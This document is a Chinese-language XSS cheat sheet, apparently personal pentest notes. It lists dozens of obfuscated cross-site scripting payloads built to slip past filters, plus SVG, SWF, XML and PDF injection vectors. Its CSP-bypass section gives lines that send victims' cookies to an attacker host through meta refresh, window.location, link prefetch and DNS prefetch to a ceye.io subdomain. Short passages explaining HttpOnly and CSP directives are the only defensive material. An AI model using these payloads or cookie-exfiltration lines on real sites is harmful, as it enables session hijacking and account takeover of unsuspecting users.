#### 常见payload

~~~js
 <script>prompt(1)</script>
 <script>confirm(1)</script>
 <script>
 var fn=window[490837..toString(1<<5)];
 fn(atob('YWxlcnQoMSk='));
 </script>
 <script>
 var fn=window[String.fromCharCode(101,118,97,108)];
 fn(atob('YWxlcnQoMSk='));
 </script>
 <script>
 var fn=window[atob('ZXZhbA==')];
 fn(atob('YWxlcnQoMSk='));
 </script>
 <script>window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>
 <script>this[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>
 <script>this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](++[[]][+[]])</script>
 <script>this[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]]((-~[]+[]))</script>
 <script>'str1ng'.replace(/1/,alert)</script>
 <script>'bbbalert(1)cccc'.replace(/a\w{4}\(\d\)/,eval)</script>
 <script>'a1l2e3r4t6'.replace(/(.).(.).(.).(.).(.)/, function(match,$1,$2,$3,$4,$5) { this[$1+$2+$3+$4+$5](1); })</script>
 <script>eval('\\u'+'0061'+'lert(1)')</script>
 <script>throw~delete~typeof~prompt(1)</script>
 <script>delete[a=alert]/prompt a(1)</script>
 <script>delete[a=this[atob('YWxlcnQ=')]]/prompt a(1)</script>
 <script>(()=>{return this})().alert(1)</script>
 <script>new function(){new.target.constructor('alert(1)')();}</script>
 <script>Reflect.construct(function(){new.target.constructor('alert(1)')()},[])</script>
 <link/rel=prefetch
import href=data:q;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>
 <link rel="import" href="data:x,<script>alert(1)</script>
 <script>Array.from`1${alert}3${window}2`</script>
 <script>!{x(){alert(1)}}.x()</script>
 <script>Array.from`${eval}alert\`1\``</script>
 <script>Array.from([1],alert)</script>
 <script>Promise.reject("1").then(null,alert)</script>
 <svg </onload ="1> (_=alert,_(1)) "">
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
 <marquee loop=1 width=0 onfinish=alert(1)>
 <p onbeforescriptexecute="alert(1)"><svg><script>\</p>
 <img onerror=alert(1) src <u></u>
 <videogt;<source onerror=javascript:prompt(911)gt;
 <base target="<script>alert(1)</script>"><a href="javascript:name">CLICK</a>
 <base href="javascript:/"><a href="**/alert(1)"><base href="javascript:/"><a href="**/alert(1)">
 <style>@KeyFrames x{</style><div style=animation-name:x onanimationstart=alert(1)> <
 <script>```${``[class extends[alert``]{}]}```</script>
 <script>[class extends[alert````]{}]</script>
 <script>throw new class extends Function{}('alert(1)')``</script>
 <script>x=new class extends Function{}('alert(1)'); x=new x;</script>
 <script>new class extends alert(1){}</script>
 <script>new class extends class extends class extends class extends alert(1){}{}{}{}</script>
 <script>new Image()[unescape('%6f%77%6e%65%72%44%6f%63%75%6d%65%6e%74')][atob('ZGVmYXVsdFZpZXc=')][8680439..toString(30)](1)</script>
 <script src=data:,\u006fnerror=\u0061lert(1)></script>
 "><svg><script/xlink:href="data:,alert(1)
 <svg><script/xlink:href=data:,alert(1)></script>
 <frameset/onpageshow=alert(1)>
 <div onactivate=alert('Xss') id=xss style=overflow:scroll>
 <div onfocus=alert('xx') id=xss style=display:table>
~~~

##### img onerror 姿势

~~~js
<img onerror="location='javascript:=lert(1)'" src="x">
<img onerror="location='javascript:%61lert(1)'" src="x">
<img onerror="location='javascript:\x2561lert(1)'" src="x">
<img onerror="location='javascript:\x255Cu0061lert(1)'" src="x" >
~~~

##### eval 姿势

~~~javascript
<script>alert(1)</script>
onfocus=javascript:alert(1)
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href=javascript:alert(1)>
~~~

##### HttpOnly

如果HTTP响应头中包含HttpOnly标志，只要浏览器支持HttpOnly标志，客户端脚本就无法访问cookie。因此，即使存在跨站点脚本（XSS）缺陷，且用户意外访问利用此漏洞的链接，浏览器也不会向第三方透露cookie。如果浏览器不支持HttpOnly并且网站尝试设置HttpOnly cookie，浏览器会忽略HttpOnly标志，从而创建一个传统的，脚本可访问的cookie

#### 绕过CSP策略

一个CSP头由多组CSP策略组成

~~~http
Content-Security-Policy: default-src 'self' www.baidu.com; script-src 'unsafe-inline'
~~~

其中每一组策略包含一个**策略指令**和一个**内容源**列表

##### 常用的策略指令

- ##### default-src

default-src 指令定义了那些没有被更精确指令指定的安全策略。这些指令包括：

- child-src

- connect-src

- font-src

- img-src

- media-src

- object-src

- script-src

- style-src

- ##### script-src

script-src定义了页面中Javascript的有效来源

- ##### style-src

style-src定义了页面中CSS样式的有效来源

- ##### img-src

img-src定义了页面中图片和图标的有效来源

- ##### font-src

font-src定义了字体加载的有效来源

- ##### connect-src

connect-src定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。

- ##### child-src

child-src 指定定义了 web workers 以及嵌套的浏览上下文（如<frame>和<iframe>）的源。

##### 内容源：

内容源有三种：源列表、关键字和数据

- ##### 源列表：指定地址

- ##### 关键字：

  ##### none

  代表空集；即不匹配任何 URL。两侧单引号是必须的。

  **'self'**
  代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。

  **'unsafe-inline'**
  允许使用内联资源，如内联的<script>元素、javascript: URL、内联的事件处理函数和内联的<style>元素，两侧单引号是必须的。

  **'unsafe-eval'**
  允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。

  ##### 数据

  - **data:**
    允许data: URI作为内容来源。
  - **mediastream:**
    允许mediastream: URI作为内容来源


##### CSP绕过方式

https://www.jianshu.com/p/f1de775bc43e

###### url跳转

在default-src 'none'的情况下，可以使用meta标签实现跳转

~~~
<meta http-equiv="refresh" content="1;url=http://www.xss.com/x.php?c=[cookie]" >
~~~

在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过

~~~js
<script>
  window.location="http://www.xss.com/x.php?c=[cookie]";
</script>
~~~

###### \<link>标签预加载

在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）

```
<link rel="prefetch" href="http://www.xss.com/x.php?c=[cookie]">
```

在Firefox下，可以将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie

~~~
<link rel="dns-prefetch" href="//[cookie].xxx.ceye.io">
~~~



#### SVG导致的XSS

~~~
markdown编辑器打XSS
~~~

~~~
可缩放矢量图形
在很多Markdown语言的编辑器中，<div> 和 <svg> 是可以直接解析的，我们在测试网站插入如下代码：
~~~

~~~html
<div width="100%" style="overflow-x: auto;"> 
<svg width="140" height="170">
<title>SVG Sample</title>
<desc>This is a sample to use SVG in markdown on the website cnblogs.</desc> <circle cx="70" cy="95" r="50" style="stroke: black; fill: none;"/>
</svg>
</div>
~~~

~~~
SVG标准中定义了script标签的存在，<svg> 遵循XML和SVG的定义，因此我们可以利用其来进行XSS攻击。因此可以通过 <svg> 加载XSSpayload，转换后的格式中 <svg> 标签不会转换，payload： <svg/onload=alert(1)> ，轻松绕过过滤：
~~~

~~~
<svg/onload=alert(1)>
~~~





#### SWF引入外部JS导致的XSS

~~~
http://localhost/phpwind/www/res/js/dev/util_libs/jPlayer/Jplayer.swf?jQuery=alert(1))}catch(e){}//

http://localhost/phpwind/www/res/js/dev/util_libs/jPlayer/Jplayer.swf?id='))}catch(e){alert(1)}//
~~~



#### XML-XSS

~~~xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">
alert("test");
</something:script>
</body>
</html>
~~~



#### PDF XSS

https://blog.csdn.net/qq_50854662/article/details/126480744

[![cb67163897d62facd5a9b7981f271d77.png](https://s1.imagehub.cc/images/2023/03/26/cb67163897d62facd5a9b7981f271d77.png)](https://www.imagehub.cc/image/XgZlj)











